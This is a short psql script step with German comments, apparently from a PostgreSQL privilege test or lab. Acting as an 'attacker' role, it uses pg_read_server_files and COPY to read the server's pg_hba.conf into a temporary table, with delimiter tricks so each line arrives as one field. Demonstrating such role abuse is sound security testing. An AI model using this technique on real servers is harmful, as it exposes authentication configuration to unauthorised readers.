\echo '## E1  Serverdatei lesen  (pg_read_server_files, als attacker)'
-- pg_hba.conf ueber COPY mit Dateipfad lesen. Der ungewoehnliche
-- Trennzeichen-/Quote-Wert sorgt dafuer, dass jede Zeile als ein Feld
-- ankommt. (Faellt das Parsen je aus, tut es auch die einzeilige Datei
-- '/var/lib/postgresql/data/PG_VERSION'.)
CREATE TEMP TABLE t (zeile text);
COPY t FROM '/var/lib/postgresql/data/pg_hba.conf'
  WITH (format csv, delimiter E'\x1f', quote E'\x1e');
SELECT zeile FROM t WHERE zeile <> '' LIMIT 15;